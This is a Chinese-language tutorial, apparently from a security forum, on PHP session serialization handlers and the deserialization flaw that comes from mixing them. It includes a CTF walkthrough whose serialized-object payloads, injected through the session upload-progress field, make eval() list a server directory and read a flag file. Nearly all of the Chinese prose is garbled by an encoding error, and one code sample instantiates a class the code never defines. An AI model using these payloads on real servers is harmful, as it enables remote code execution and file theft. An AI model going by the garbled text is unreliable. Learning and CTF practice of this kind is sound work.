<p><code>session</code>è‹±æ–‡ç¿»è¯‘ä¸º&quot;ä¼šè¯&quot;ï¼Œä¸¤ä¸ªäººèŠå¤©ä»å¼€å§‹åˆ°ç»“æŸå°±æ„æˆäº†ä¸€ä¸ªä¼šè¯ã€‚<code>PHP</code>é‡Œçš„<code>session</code>ä¸»è¦æ˜¯æŒ‡å®¢æˆ·ç«¯æµè§ˆå™¨ä¸æœåŠ¡ç«¯æ•°æ®äº¤æ¢çš„å¯¹è¯ï¼Œä»æµè§ˆå™¨æ‰“å¼€åˆ°å…³é—­ï¼Œä¸€ä¸ªæœ€ç®€å•çš„ä¼šè¯å‘¨æœŸ</p>
<h2 id="php-sessionå·¥ä½œæµç¨‹">PHP sessionå·¥ä½œæµç¨‹</h2>
<p>ä¼šè¯çš„å·¥ä½œæµç¨‹å¾ˆç®€å•ï¼Œå½“å¼€å§‹ä¸€ä¸ªä¼šè¯æ—¶ï¼Œ<code>PHP</code>ä¼šå°è¯•ä»è¯·æ±‚ä¸­æŸ¥æ‰¾ä¼šè¯ <code>ID</code> ï¼ˆé€šå¸¸é€šè¿‡ä¼šè¯ <code>cookie</code>ï¼‰ï¼Œå¦‚æœå‘ç°è¯·æ±‚çš„<code>Cookie</code>ã€<code>Get</code>ã€<code>Post</code>ä¸­ä¸å­˜åœ¨<code>session id</code>ï¼Œ<code>PHP</code> å°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>php_session_create_id</code>å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œå¹¶ä¸”åœ¨<code>http response</code>ä¸­é€šè¿‡<code>set-cookie</code>å¤´éƒ¨å‘é€ç»™å®¢æˆ·ç«¯ä¿å­˜ï¼Œä¾‹å¦‚ç™»å½•å¦‚ä¸‹ç½‘é¡µ<code>Cokkieã€Getã€Post</code>éƒ½ä¸å­˜åœ¨<code>session id</code>ï¼Œäºæ˜¯å°±ä½¿ç”¨äº†<code>set-cookie</code>å¤´</p>
<figure data-type="image" tabindex="17"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>æœ‰æ—¶å€™æµè§ˆå™¨ç”¨æˆ·è®¾ç½®ä¼šç¦æ­¢ <code>cookie</code>ï¼Œå½“åœ¨å®¢æˆ·ç«¯<code>cookie</code>è¢«ç¦ç”¨çš„æƒ…å†µä¸‹ï¼Œ<code>php</code>ä¹Ÿå¯ä»¥è‡ªåŠ¨å°†<code>session id</code>æ·»åŠ åˆ°<code>url</code>å‚æ•°ä¸­ä»¥åŠ<code>form</code>çš„<code>hidden</code>å­—æ®µä¸­ï¼Œä½†è¿™éœ€è¦å°†<code>php.ini</code>ä¸­çš„<code>session.use_trans_sid</code>è®¾ä¸ºå¼€å¯ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶è°ƒç”¨<code>ini_set</code>æ¥è®¾ç½®è¿™ä¸ªé…ç½®é¡¹</p>
<p>ä¼šè¯å¼€å§‹ä¹‹åï¼Œ<code>PHP</code> å°±ä¼šå°†ä¼šè¯ä¸­çš„æ•°æ®è®¾ç½®åˆ° <code>$_SESSION</code> å˜é‡ä¸­ï¼Œå¦‚ä¸‹è¿°ä»£ç å°±æ˜¯ä¸€ä¸ªåœ¨ <code>$_SESSION</code> å˜é‡ä¸­æ³¨å†Œå˜é‡çš„ä¾‹å­ï¼š</p>
<pre><code>&lt;?php
session_start();
if (!isset($_SESSION['username'])) {
  $_SESSION['username'] = 'ghtwf01' ;
}
?&gt;
</code></pre>
<p>ä»£ç çš„æ„æ€å°±æ˜¯å¦‚æœä¸å­˜åœ¨<code>session</code>é‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ª<code>session</code><br>
ä¹Ÿå¯ä»¥ç”¨å¦‚ä¸‹æµç¨‹å›¾è¡¨ç¤º</p>
<figure data-type="image" tabindex="18"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144840-76164138-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144840-76164138-0518-1.png" alt="img" loading="lazy"></a></figure>
<h2 id="phpinié…ç½®">php.inié…ç½®</h2>
<p><code>php.ini</code>é‡Œé¢æœ‰å¦‚ä¸‹å…­ä¸ªç›¸å¯¹é‡è¦çš„é…ç½®</p>
<pre><code>session.save_path=&quot;&quot;      --è®¾ç½®sessionçš„å­˜å‚¨ä½ç½®
session.save_handler=&quot;&quot;   --è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®sessionå­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°
session.auto_start        --æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤å€¼ä¸º 0ï¼Œä¸å¯åŠ¨
session.serialize_handler --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ï¼Œé»˜è®¤ä½¿ç”¨php  
session.upload_progress.enabled --å¯ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$ _SESSIONå˜é‡ï¼Œé»˜è®¤å¯ç”¨
session.upload_progress.cleanup --è¯»å–æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åï¼Œç«‹å³æ¸…ç†è¿›åº¦ä¿¡æ¯ï¼Œé»˜è®¤å¯ç”¨
</code></pre>
<p>å¦‚<code>phpstudy</code>ä¸‹ä¸Šè¿°é…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code>session.save_path = &quot;/tmp&quot;      --æ‰€æœ‰sessionæ–‡ä»¶å­˜å‚¨åœ¨/tmpç›®å½•ä¸‹
session.save_handler = files    --è¡¨æ˜sessionæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥è¿›è¡Œå­˜å‚¨çš„
session.auto_start = 0          --è¡¨æ˜é»˜è®¤ä¸å¯åŠ¨session
session.serialize_handler = php --è¡¨æ˜sessionçš„é»˜è®¤(å)åºåˆ—åŒ–å¼•æ“ä½¿ç”¨çš„æ˜¯php(å)åºåˆ—åŒ–å¼•æ“
session.upload_progress.enabled on --è¡¨æ˜å…è®¸ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$ _SESSIONå˜é‡
session.upload_progress.cleanup on --è¡¨æ˜æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åï¼Œç«‹å³æ¸…ç†è¿›åº¦ä¿¡æ¯($ _SESSIONå˜é‡)
</code></pre>
<h2 id="php-session-çš„å­˜å‚¨æœºåˆ¶">PHP session çš„å­˜å‚¨æœºåˆ¶</h2>
<p>ä¸Šæ–‡ä¸­æåˆ°äº† <code>PHP session</code>çš„å­˜å‚¨æœºåˆ¶æ˜¯ç”±<code>session.serialize_handler</code>æ¥å®šä¹‰å¼•æ“çš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ï¼Œä¸”å­˜å‚¨çš„æ–‡ä»¶æ˜¯ç”±<code>sess_sessionid</code>æ¥å†³å®šæ–‡ä»¶åçš„ï¼Œå½“ç„¶è¿™ä¸ªæ–‡ä»¶åä¹Ÿä¸æ˜¯ä¸å˜çš„ï¼Œéƒ½æ˜¯<code>sess_sessionid</code>å½¢å¼</p>
<figure data-type="image" tabindex="19"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144846-79d7b220-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144846-79d7b220-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>æ‰“å¼€çœ‹ä¸€ä¸‹å…¨æ˜¯åºåˆ—åŒ–åçš„å†…å®¹</p>
<figure data-type="image" tabindex="20"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144851-7c6e2e6a-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144851-7c6e2e6a-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹<code>session.serialize_handler</code>ï¼Œå®ƒå®šä¹‰çš„å¼•æ“æœ‰ä¸‰ç§</p>
<p>| å¤„ç†å™¨åç§° | å­˜å‚¨æ ¼å¼ |<br>
| php | é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ |<br>
| php_binary | é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼|<br>
| php_serialize(php&gt;5.5.4) | ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„ |</p>
<h3 id="phpå¤„ç†å™¨">phpå¤„ç†å™¨</h3>
<p>é¦–å…ˆæ¥çœ‹çœ‹<code>session.serialize_handler</code>ç­‰äº<code>php</code>æ—¶å€™çš„åºåˆ—åŒ–ç»“æœï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
error_reporting(0);
ini_set('session.serialize_handler','php');
session_start();
$_SESSION['session'] = $_GET['session'];
?&gt;
session`çš„`sessionid`å…¶å®å¯ä»¥çœ‹åˆ°çš„ï¼Œä¸º`i38age8ok4bofpiuiku3h20fh0
</code></pre>
<figure data-type="image" tabindex="21"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144859-81378040-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144859-81378040-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>äºæ˜¯æˆ‘ä»¬åˆ°<code>session</code>å­˜å‚¨ç›®å½•æŸ¥çœ‹ä¸€ä¸‹<code>session</code>æ–‡ä»¶å†…å®¹</p>
<figure data-type="image" tabindex="22"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144905-85162680-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144905-85162680-0518-1.png" alt="img" loading="lazy"></a></figure>
<p><code>session</code>ä¸º<code>$_SESSION['session']</code>çš„é”®åï¼Œ<code>|</code>åä¸ºä¼ å…¥<code>GET</code>å‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼</p>
<h3 id="php_binaryå¤„ç†å™¨">php_binaryå¤„ç†å™¨</h3>
<p>å†æ¥çœ‹çœ‹<code>session.serialize_handler</code>ç­‰äº<code>php_binary</code>æ—¶å€™çš„åºåˆ—åŒ–ç»“æœ</p>
<pre><code>&lt;?php
error_reporting(0);
ini_set('session.serialize_handler','php_binary');
session_start();
$_SESSION['sessionsessionsessionsessionsession'] = $_GET['session'];
?&gt;
</code></pre>
<p>ä¸ºäº†æ›´èƒ½ç›´è§‚çš„ä½“ç°å‡ºæ ¼å¼çš„å·®åˆ«ï¼Œå› æ­¤è¿™é‡Œè®¾ç½®äº†é”®å€¼é•¿åº¦ä¸º <code>35</code>ï¼Œ<code>35</code> å¯¹åº”çš„ <code>ASCII</code> ç ä¸º<code>#</code>ï¼Œæ‰€ä»¥æœ€ç»ˆçš„ç»“æœå¦‚ä¸‹</p>
<figure data-type="image" tabindex="23"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144911-888b7d60-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144911-888b7d60-0518-1.png" alt="img" loading="lazy"></a></figure>
<p><code>#</code>ä¸ºé”®åé•¿åº¦å¯¹åº”çš„ <code>ASCII</code> çš„å€¼ï¼Œ<code>sessionsessionsessionsessionsessions</code>ä¸ºé”®åï¼Œ<code>s:7:&quot;xianzhi&quot;;</code>ä¸ºä¼ å…¥ <code>GET</code> å‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼</p>
<h3 id="php_serialize-å¤„ç†å™¨">php_serialize å¤„ç†å™¨</h3>
<p>æœ€åå°±æ˜¯<code>session.serialize_handler</code>ç­‰äº<code>php_serialize</code>æ—¶å€™çš„åºåˆ—åŒ–ç»“æœï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
?&gt;
</code></pre>
<p>ç»“æœå¦‚ä¸‹</p>
<figure data-type="image" tabindex="24"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144917-8c3357da-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144917-8c3357da-0518-1.png" alt="img" loading="lazy"></a></figure>
<p><code>a:1</code>è¡¨ç¤º<code>$_SESSION</code>æ•°ç»„ä¸­æœ‰ <code>1</code> ä¸ªå…ƒç´ ï¼ŒèŠ±æ‹¬å·é‡Œé¢çš„å†…å®¹å³ä¸ºä¼ å…¥<code>GET</code>å‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼</p>
<h2 id="sessionçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨">sessionçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</h2>
<p><code>php</code>å¤„ç†å™¨å’Œ<code>php_serialize</code>å¤„ç†å™¨è¿™ä¸¤ä¸ªå¤„ç†å™¨ç”Ÿæˆçš„åºåˆ—åŒ–æ ¼å¼æœ¬èº«æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸¤ä¸ªå¤„ç†å™¨æ··åˆèµ·æ¥ç”¨ï¼Œå°±ä¼šé€ æˆå±å®³ã€‚å½¢æˆçš„åŸç†å°±æ˜¯åœ¨ç”¨<code>session.serialize_handler = php_serialize</code>å­˜å‚¨çš„å­—ç¬¦å¯ä»¥å¼•å…¥ <code>|</code> , å†ç”¨<code>session.serialize_handler = php</code>æ ¼å¼å–å‡º<code>$_SESSION</code>çš„å€¼æ—¶ï¼Œ |ä¼šè¢«å½“æˆé”®å€¼å¯¹çš„åˆ†éš”ç¬¦ï¼Œåœ¨ç‰¹å®šçš„åœ°æ–¹ä¼šé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚<br>
æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª<code>session.php</code>ï¼Œç”¨äºä¼ è¾“<code>session</code>å€¼ï¼Œé‡Œé¢ä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
?&gt;
</code></pre>
<p>å†åˆ›å»ºä¸€ä¸ª<code>hello.php</code>ï¼Œé‡Œé¢ä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    error_reporting(0);
  ini_set('session.serialize_handler','php');
  session_start();
    class D0g3{
    public $name = 'panda';
    function __wakeup(){
      echo &quot;Who are you?&quot;;
    }
    function __destruct(){
      echo '&lt;br&gt;'.$this-&gt;name;
    }
  }
  $str = new XianZhi();
 ?&gt;
</code></pre>
<p>è¿™ä¸¤ä¸ªæ–‡ä»¶çš„ä½œç”¨å¾ˆæ¸…æ™°ï¼Œ<code>session.php</code>æ–‡ä»¶çš„å¤„ç†å™¨æ˜¯<code>php_serialize</code>ï¼Œ<code>hello.php</code>æ–‡ä»¶çš„å¤„ç†å™¨æ˜¯<code>php</code>ï¼Œ<code>session.php</code>æ–‡ä»¶çš„ä½œç”¨æ˜¯ä¼ å…¥å¯æ§çš„ <code>session</code>å€¼ï¼Œ<code>hello.php</code>æ–‡ä»¶çš„ä½œç”¨æ˜¯åœ¨ååºåˆ—åŒ–å¼€å§‹å‰è¾“å‡º<code>Who are you?</code>ï¼Œååºåˆ—åŒ–ç»“æŸçš„æ—¶å€™è¾“å‡º<code>name</code>å€¼<br>
è¿è¡Œä¸€ä¸‹<code>hello.php</code>çœ‹ä¸€ä¸‹æ•ˆæœ</p>
<figure data-type="image" tabindex="25"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144925-90e78454-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144925-90e78454-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>æˆ‘ä»¬ç”¨å¦‚ä¸‹ä»£ç æ¥å¤ç°ä¸€ä¸‹<code>session</code>çš„ååºåˆ—åŒ–æ¼æ´</p>
<pre><code>&lt;?php
    class D0g3{
    public $name = 'ghtwf01';
    function __wakeup(){
      echo &quot;Who are you?&quot;;
    }
    function __destruct(){
      echo '&lt;br&gt;'.$this-&gt;name;
    }
  }
  $str = new D0g3();
  echo serialize($str);
 ?&gt;
</code></pre>
<p>è¾“å‡ºç»“æœä¸º</p>
<figure data-type="image" tabindex="26"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144932-94f8e8a8-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144932-94f8e8a8-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>å› ä¸º<code>session</code>æ˜¯<code>php_serialize</code>å¤„ç†å™¨ï¼Œæ‰€ä»¥å…è®¸<code>|</code>å­˜åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œæ‰€ä»¥å°†è¿™æ®µä»£ç åºåˆ—åŒ–å†…å®¹å‰é¢åŠ ä¸Š<code>|</code>ä¼ å…¥<code>session.php</code>ä¸­<br>
ç°åœ¨æ¥çœ‹ä¸€ä¸‹å­˜å…¥<code>session</code>æ–‡ä»¶çš„å†…å®¹</p>
<figure data-type="image" tabindex="27"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144936-97555262-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144936-97555262-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>å†æ‰“å¼€<code>hello.php</code></p>
<figure data-type="image" tabindex="28"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144941-9a2ff17c-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144941-9a2ff17c-0518-1.png" alt="img" loading="lazy"></a></figure>
<h2 id="ä¸€é“ctfé¢˜phpinfo">ä¸€é“CTFé¢˜:PHPINFO</h2>
<p>é¢˜ç›®é“¾æ¥ï¼šhttp://web.jarvisoj.com:32784/<br>
é¢˜ç›®ä¸­ç»™å‡ºå¦‚ä¸‹ä»£ç </p>
<pre><code>&lt;?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this-&gt;mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        eval($this-&gt;mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?&gt;
</code></pre>
<p>ä»”ç»†çœ‹äº†ä¸€éå‘ç°é¢˜ç›®æ²¡æœ‰å…¥å£ï¼Œæ³¨æ„åˆ°<code>ini_set('session.serialize_handler', 'php')</code>ï¼Œæƒ³åˆ°å¯ä¸å¯èƒ½æ˜¯<code>session</code>ååºåˆ—åŒ–æ¼æ´ï¼Œçœ‹ä¸€ä¸‹<code>phpinfo</code>,å‘ç°<code>session.serialize_handler</code>è®¾ç½®å¦‚ä¸‹</p>
<pre><code>local value(å½“å‰ç›®å½•ï¼Œä¼šè¦†ç›–master valueå†…å®¹):php
master value(ä¸»ç›®å½•ï¼Œphp.inié‡Œé¢çš„å†…å®¹):php_serialize
</code></pre>
<p>è¿™ä¸ªå¾ˆæ˜æ˜¾å°±å­˜åœ¨<code>php session</code>ååºåˆ—åŒ–æ¼æ´ï¼Œä½†æ˜¯å…¥å£ç‚¹åœ¨å“ªé‡Œï¼Œæ€ä¹ˆæ§åˆ¶<code>session</code>çš„å€¼<br>
åœ¨<code>phpinfo</code>é‡Œé¢çœ‹åˆ°äº†</p>
<pre><code>session.upload_progress.enabled on
session.upload_progress.cleanup off
</code></pre>
<p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶<code>POST</code>ä¸€ä¸ªä¸<code>INI</code>ä¸­è®¾ç½®çš„<code>session.upload_progress.name</code>åŒåå˜é‡æ—¶ï¼Œå½“<code>PHP</code>æ£€æµ‹åˆ°è¿™ç§<code>POST</code>è¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨<code>$_SESSION</code>ä¸­æ·»åŠ ä¸€ç»„æ•°æ®ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡<code>Session Upload Progress</code>æ¥è®¾ç½®<code>session</code><br>
å…è®¸ä¸Šä¼ ä¸”ç»“æŸåä¸æ¸…é™¤æ•°æ®ï¼Œè¿™æ ·æ›´æœ‰åˆ©äºåˆ©ç”¨<br>
åœ¨<code>html</code>ç½‘é¡µæºä»£ç ä¸Šé¢æ·»åŠ å¦‚ä¸‹ä»£ç </p>
<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
    &lt;input type=&quot;submit&quot; /&gt;
&lt;/form&gt;
</code></pre>
<figure data-type="image" tabindex="29"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144955-a28f8bca-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144955-a28f8bca-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•åˆ©ç”¨</p>
<pre><code>&lt;?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class OowoO
{
    public $mdzz='print_r(scandir(dirname(__FILE__)));';
}
$obj = new OowoO();
echo serialize($obj);
?&gt;
</code></pre>
<p>å¾—åˆ°</p>
<figure data-type="image" tabindex="30"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145001-a60c44a0-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145001-a60c44a0-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>ä¸ºäº†é˜²æ­¢è½¬ä¹‰ï¼Œåœ¨æ¯ä¸ªåŒå¼•å·å‰åŠ ä¸Š<code>\</code>ï¼Œå³</p>
<pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}
</code></pre>
<p>ç‚¹å‡»æäº¤ï¼Œ<code>burpsuite</code>æŠ“åŒ…å°†<code>filename</code>çš„å€¼æ”¹ä¸ºå®ƒ</p>
<figure data-type="image" tabindex="31"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145006-a8ff3988-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145006-a8ff3988-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>æŸ¥è¯¢åˆ°å½“å‰ç›®å½•æœ‰å“ªäº›æ–‡ä»¶äº†ï¼Œåœ¨<code>phpinfo</code>é‡Œé¢æŸ¥çœ‹åˆ°å½“å‰ç›®å½•è·¯å¾„</p>
<figure data-type="image" tabindex="32"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145010-abb3dd46-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145010-abb3dd46-0518-1.png" alt="img" loading="lazy"></a></figure>
<p>äºæ˜¯æˆ‘ä»¬åˆ©ç”¨</p>
<pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));
</code></pre>
<p>æ¥è¯»å–<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>ä¸­çš„å†…å®¹ï¼ŒåŒæ ·çš„é“ç†åŠ ä¸Š<code>\</code>åå°†<code>filename</code>æ”¹ä¸º</p>
<pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}
</code></pre>
<p>å¾—åˆ°<code>flag</code></p>
<figure data-type="image" tabindex="33"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145016-aefb991c-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145016-aefb991c-0518-1.png" alt="img" loading="lazy"></a></figure>
<h1 id="pharæ‹“å±•ååºåˆ—åŒ–æ”»å‡»é¢">pharæ‹“å±•ååºåˆ—åŒ–æ”»å‡»é¢</h1>
<h2 id="pharæ–‡ä»¶ç®€ä»‹">pharæ–‡ä»¶ç®€ä»‹</h2>
<h3 id="æ¦‚å¿µ">æ¦‚å¿µ</h3>
<p>ä¸€ä¸ª<code>php</code>åº”ç”¨ç¨‹åºå¾€å¾€æ˜¯ç”±å¤šä¸ªæ–‡ä»¶æ„æˆçš„ï¼Œå¦‚æœèƒ½æŠŠä»–ä»¬é›†ä¸­ä¸ºä¸€ä¸ªæ–‡ä»¶æ¥åˆ†å‘å’Œè¿è¡Œæ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œè¿™æ ·çš„åˆ—å­æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚åœ¨<code>window</code>æ“ä½œç³»ç»Ÿä¸Šé¢çš„å®‰è£…ç¨‹åºã€ä¸€ä¸ª<code>jquery</code>åº“ç­‰ç­‰ï¼Œä¸ºäº†åšåˆ°è¿™ç‚¹<code>php</code>é‡‡ç”¨äº†<code>phar</code>æ–‡æ¡£æ–‡ä»¶æ ¼å¼ï¼Œè¿™ä¸ªæ¦‚å¿µæºè‡ª<code>java</code>çš„<code>jar</code>ï¼Œä½†æ˜¯åœ¨è®¾è®¡æ—¶ä¸»è¦é’ˆå¯¹ PHP çš„ Web ç¯å¢ƒï¼Œä¸ <code>JAR</code> å½’æ¡£ä¸åŒçš„æ˜¯<code>Phar</code>å½’æ¡£å¯ç”± <code>PHP</code> æœ¬èº«å¤„ç†ï¼Œå› æ­¤ä¸éœ€è¦ä½¿ç”¨é¢å¤–çš„å·¥å…·æ¥åˆ›å»ºæˆ–ä½¿ç”¨ï¼Œä½¿ç”¨<code>php</code>è„šæœ¬å°±èƒ½åˆ›å»ºæˆ–æå–å®ƒã€‚<code>phar</code>æ˜¯ä¸€ä¸ªåˆæˆè¯ï¼Œç”±<code>PHP</code>å’Œ <code>Archive</code>æ„æˆï¼Œå¯ä»¥çœ‹å‡ºå®ƒæ˜¯<code>php</code>å½’æ¡£æ–‡ä»¶çš„æ„æ€(ç®€å•æ¥è¯´<code>phar</code>å°±æ˜¯<code>php</code>å‹ç¼©æ–‡æ¡£ï¼Œä¸ç»è¿‡è§£å‹å°±èƒ½è¢« <code>php</code> è®¿é—®å¹¶æ‰§è¡Œ)</p>
<h3 id="pharç»„æˆç»“æ„">pharç»„æˆç»“æ„</h3>
<pre><code>stubï¼šå®ƒæ˜¯pharçš„æ–‡ä»¶æ ‡è¯†ï¼Œæ ¼å¼ä¸ºxxx&lt;?php xxx; __HALT_COMPILER();?&gt;;
manifestï¼šä¹Ÿå°±æ˜¯meta-dataï¼Œå‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥åºåˆ—åŒ–å­˜å‚¨
contentsï¼šå‹ç¼©æ–‡ä»¶çš„å†…å®¹
signatureï¼šç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾
</code></pre>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå…³é”®ç‚¹ï¼Œä¸€æ˜¯æ–‡ä»¶æ ‡è¯†ï¼Œå¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>ç»“å°¾ï¼Œä½†å‰é¢çš„å†…å®¹æ²¡æœ‰é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è½»æ˜“ä¼ªé€ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶æˆ–è€…å…¶å®ƒæ–‡ä»¶æ¥ç»•è¿‡ä¸€äº›ä¸Šä¼ é™åˆ¶ï¼›äºŒæ˜¯ååºåˆ—åŒ–ï¼Œ<code>phar</code>å­˜å‚¨çš„<code>meta-data</code>ä¿¡æ¯ä»¥åºåˆ—åŒ–æ–¹å¼å­˜å‚¨ï¼Œå½“æ–‡ä»¶æ“ä½œå‡½æ•°é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æ<code>phar</code>æ–‡ä»¶æ—¶å°±ä¼šå°†æ•°æ®ååºåˆ—åŒ–ï¼Œè€Œè¿™æ ·çš„æ–‡ä»¶æ“ä½œå‡½æ•°æœ‰å¾ˆå¤š</p>
<h3 id="å‰ææ¡ä»¶">å‰ææ¡ä»¶</h3>
<pre><code>php.iniä¸­è®¾ç½®ä¸ºphar.readonly=Off
php version&gt;=5.3.0
</code></pre>
<h2 id="pharååºåˆ—åŒ–æ¼æ´">pharååºåˆ—åŒ–æ¼æ´</h2>
